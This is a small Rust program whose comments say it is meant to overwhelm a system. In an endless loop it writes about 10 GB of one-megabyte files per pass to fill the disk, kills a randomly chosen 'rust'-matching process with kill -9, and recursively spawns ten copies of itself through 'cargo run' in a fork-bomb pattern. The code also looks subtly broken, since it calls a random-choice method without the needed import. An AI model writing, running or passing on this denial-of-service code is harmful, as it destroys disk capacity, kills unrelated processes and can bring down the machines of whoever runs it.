use std::fs;
use std::fs::File;
use std::io::Write;
use std::process::Command;

// Function to generate large data structure
fn generate_data() -> String {
    "a".repeat(10usize.pow(6))
}

// Function to kill a random process
fn kill_random_process() -> String {
    let output = Command::new("pgrep").arg("rust").output().unwrap();
    let process_ids = String::from_utf8_lossy(&output.stdout);
    let pids: Vec<&str> = process_ids.split('\n').collect();
    let process_to_kill = pids.choose(&mut rand::thread_rng()).unwrap();
    let output = Command::new("kill").arg("-9").arg(process_to_kill).output().unwrap();
    String::from_utf8_lossy(&output.stdout).to_string()
}

// Function to overwhelm the system
fn overwhelm_system() {
    println!("Overwhelming system...");
    for _ in 0..10 {
        Command::new("cargo").arg("run").spawn().expect("Failed to start child process");
    }
}

fn main() {
    let mut count = 1;

    loop {
        // Generate large data structure to consume memory
        let data = generate_data();

        // Save to multiple text files (simulated)
        for i in 0..10000 {
            let mut file = File::create(format!("output_{}_{}.txt", count, i)).expect("Unable to create file");
            file.write_all(data.as_bytes()).expect("Unable to write to file");
        }

        count += 1;

        // Kill random process every 50 iterations
        if count % 50 == 0 {
            let killed_process = kill_random_process();
            println!("Killed process with PID: {}", killed_process);
        }

        // Overwhelm the system every 100 iterations
        if count % 100 == 0 {
            overwhelm_system();
        }
    }
}
